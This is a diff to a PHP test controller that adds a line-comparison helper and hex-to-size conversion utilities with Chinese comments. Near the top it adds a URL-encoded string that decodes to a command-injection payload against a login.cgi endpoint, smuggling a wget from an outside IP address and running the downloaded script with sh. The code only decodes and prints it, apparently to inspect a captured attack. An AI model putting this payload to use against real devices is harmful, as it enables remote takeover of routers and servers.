@@ -143,6 +143,10 @@ class TestController extends Controller
     {
         /* test foundAllFsOfKey */
 
+        $s = 'login.cgi?cli=aa%20aa%27;wget%20http://217.61.6.127/t%20-O%20-%3E%20/tmp/t;sh%20/tmp/t%27';
+        $d = urldecode($s);
+        \D::pdse($d);
+
         $text = 'abbaabbaabb';
         $fs = $this->foundAllFsOfKey($text);
 
@@ -873,5 +877,362 @@ e7a4b53a063f4343b6cfbe3edcf1c063
 //
 //        \D::pd(cos(1));
         $this->render('circle');
+    }
+
+    public function actionDiff()
+    {
+        $s = file_get_contents('D:\tmp\seats\1.txt');
+        $ss = file_get_contents('D:\tmp\seats\2.txt');
+
+        $d = explode("\n", $s);
+        $dd = explode("\n", $ss);
+
+        $diff = $this->diff($d, $dd);
+        \D::pd($diff);
+    }
+
+    public function diff($d, $dd)
+    {
+        sort($d);
+        sort($dd);
+
+        $len = count($d);
+        $len2 = count($dd);
+
+        if ($len > $len2) {
+            $large = $d;
+            $small = $dd;
+        } else {
+            $large = $dd;
+            $small = $d;
+        }
+
+        $diff = [];
+        foreach ($large as $item) {
+            $item = trim($item);
+
+            if ($item == '') {
+                continue;
+            }
+
+            $found = false;
+            foreach ($small as $value) {
+                $value = trim($value);
+
+                if ($value == '') {
+                    continue;
+                }
+
+                if (strcmp($item, $value) == 0) {
+                    $found = true;
+                    break;
+                }
+            }
+
+            if (!$found) {
+                $diff[] = $item;
+            }
+        }
+
+        return $diff;
+    }
+
+    /**
+     * 十六进制显示大小.
+     */
+    public function actionHexSize()
+    {
+        // 范围开始和结束，结束>=开始
+        $begin = Yii::app()->request->getQuery('begin');
+        $end = Yii::app()->request->getQuery('end');
+
+        // 大写去空格
+        $begin = strtoupper(trim($begin));
+        $end = strtoupper(trim($end));
+
+        // 验证格式
+        $error = $this->validateHex($begin);
+        if ($error) {
+            exit($error);
+        }
+
+        // 验证格式
+        $error = $this->validateHex($end);
+        if ($error) {
+            exit($error);
+        }
+
+        $this->getHexSize2($begin, $end);
+    }
+
+    public function getHexSize2($begin, $end)
+    {
+        $beginSize = $this->binaryToSize2($begin);
+        $endSize = $this->binaryToSize2($end);
+        \D::pd($beginSize, $endSize);
+
+         // 相减：第一个减去第二个
+        $minus = $this->minusSize2($endSize, $beginSize);
+        \D::pd($minus);
+
+        // 格式化显示
+        $beginSize = $this->formatSize2($beginSize);
+        $endSize = $this->formatSize2($endSize);
+        $minus = $this->formatSize2($minus);
+        \D::pd($beginSize, $endSize);
+        \D::pd($minus);
+    }
+
+    public function minusSize2($endSize, $beginSize)
+    {
+        $endSize['value'] -= $beginSize['value'];
+        return $endSize;
+    }
+
+    public function binaryToSize2($string)
+    {
+        $number = hexdec($string);
+
+        $unit = '';
+        $unitMap = [
+            '6'=>'E',
+            '5'=>'P',
+            '4'=>'T',
+            '3'=>'G',
+            '2'=>'M',
+            '1'=>'K',
+            '0'=>'',
+        ];
+        $i = 1;
+        while ($number >= 1024) {
+            $unit = $unitMap[$i];
+            $number = $number / 1024;
+            $i++;
+        }
+
+        return ['value'=>$number, 'unit'=>$unit];
+    }
+
+    public function formatSize2($number)
+    {
+
+    }
+
+    public function getHexSize($begin, $end)
+    {
+        // 转二进制字符串
+        $beginBinary = $this->hexToBinary($begin);
+        $endBinary = $this->hexToBinary($end);
+
+        // 二进制字符串转大小：分段标识，避免因为整数过大导致溢出
+        $beginSize = $this->binaryToSize($beginBinary);
+        $endSize = $this->binaryToSize($endBinary);
+//        \D::pd($beginSize, $endSize);
+
+        // 相减：第一个减去第二个
+        $minus = $this->minusSize($endSize, $beginSize);
+//        \D::pd($minus);
+
+        // 格式化显示
+        $beginSize = $this->formatSize($beginSize);
+        $endSize = $this->formatSize($endSize);
+        $minus = $this->formatSize($minus);
+//        \D::pd($beginSize, $endSize);
+//        \D::pd($minus);
+    }
+
+    /**
+     * 相减：第一个减去第二个，按对应单位值相减.
+     * @param $a
+     * @param $b
+     * @return mixed
+     */
+    public function minusSize($a, $b)
+    {
+        // 取项目数较大的作为第一项
+        if (count($a) > count($b)) {
+            $first = $a;
+            $second = $b;
+        } else {
+            $first = $b;
+            $second = $a;
+        }
+
+        // 遍历所有分段
+        foreach ($first as $index => $row) {
+
+            // 如果对应分段找不到，不处理
+            if (!isset($second[$index])) {
+                continue;
+            }
+
+            // 对应字段相减，其它信息不变
+            $first[$index]['value'] -= $second[$index]['value'];
+        }
+
+        return $first;
+    }
+
+    /**
+     * 格式化显示.
+     * @param $data
+     * @return string
+     */
+    public function formatSize($data)
+    {
+        $res = [];
+        foreach ($data as $row) {
+
+            // 每一项直接拼接值和单位
+            $res[] = $row['value'] . $row['unit'];
+        }
+
+        // 用加号拼接
+        $string = implode(' + ', $res);
+
+        // 如果拼接结果等于空串，就表示结果是0
+        return $string === '' ? '0' : $string;
+    }
+
+    /**
+     * 二进制字符串转大小：分段标识，避免因为整数过大导致溢出.
+     * @param $string
+     * @return array
+     */
+    public function binaryToSize($string)
+    {
+        $res = [];
+
+        // 分段标识：索引乘以10表示二进制位数长度，一个长度对应一个单位
+        $unitMap = [
+            '6'=>'E',
+            '5'=>'P',
+            '4'=>'T',
+            '3'=>'G',
+            '2'=>'M',
+            '1'=>'K',
+            '0'=>'',
+        ];
+
+        $len = strlen($string);
+
+        for ($i=6; $i>=0; $i--) {
+
+            // 当前分段的分隔长度
+            $section = $i * 10;
+
+            // 如果当前二进制串长度小于分段分隔长度则不处理
+            if ($len < $section) {
+                continue;
+            }
+
+            // 获取分段之前的子串，这一段就是真实想要的数字，转成十进制
+            $sub = substr($string, 0, $len - $section);
+            $value = bindec($sub);
+
+            // 如果十进制为0，跳过
+            if ($value == 0) {
+                continue;
+            }
+
+            $unit = $unitMap[$i];
+            $res[] = [
+                'i'=>$i,
+                'section'=>$section,
+                'len'=>$len,
+                'sub'=>$sub,
+                'string'=>$string,
+                'value'=>$value,
+                'unit'=>$unit,
+            ];
+
+            // 子串长度
+            $subLen = strlen($sub);
+
+            // 用子串做下一个循环
+            $string = substr($string, $subLen);
+
+            // 用子串长度
+            $len = $len - $subLen;
+        }
+
+        return $res;
+    }
+
+    /**
+     * 十六进制转二进制.
+     * @param $string
+     * @return string
+     */
+    public function hexToBinary($string)
+    {
+        // 跳过开头的0x
+        $string = substr($string, 2);
+
+        // 十六进制字符和二进制编码映射表
+        $map = $this->getHexBinaryMap();
+
+        $res = '';
+        $len = strlen($string);
+        for ($i=0; $i<$len; $i++) {
+
+            // 直接取二进制编码拼接
+            $res .= $map[$string[$i]];
+        }
+        return $res;
+    }
+
+    /**
+     * 验证十六进制格式.
+     * @param $string
+     * @return null|string
+     */
+    public function validateHex($string)
+    {
+        // 十六进制长度至少4个字符
+        $len = strlen($string);
+        if ($len < 4) {
+            return '十六进制长度至少4个字符';
+        }
+
+        // 十六进制长度一定是2的倍数
+        if ($len % 2 != 0) {
+            return '十六进制长度一定是2的倍数';
+        }
+
+        // 十六进制以0x开头
+        $prefix = substr($string, 0, 2);
+        if ($prefix != '0X') {
+            return '十六进制以0x开头';
+        }
+
+        // 十六进制用到的字符必须是0-F
+        $i = 2;
+        $range = array_keys($this->getHexBinaryMap());
+        while ($i < $len) {
+            if (!in_array($string[$i], $range)) {
+                return '十六进制用到的字符必须是0-F';
+            }
+            $i++;
+        }
+
+        return null;
+    }
+
+    private $hexBinaryMap;
+
+    /**
+     * 获取十六进制字符和二进制编码映射表.
+     * @return array|null
+     */
+    public function getHexBinaryMap()
+    {
+        if ($this->hexBinaryMap === null) {
+            $this->hexBinaryMap = [
+                '0'=>'0000', '1'=>'0001', '2'=>'0010', '3'=>'0011', '4'=>'0100', '5'=>'0101', '6'=>'0110', '7'=>'0111',
+                '8'=>'1000', '9'=>'1001', 'A'=>'1010', 'B'=>'1011', 'C'=>'1100', 'D'=>'1101', 'E'=>'1110', 'F'=>'1111'
+            ];
+        }
+        return $this->hexBinaryMap;
     }
 }
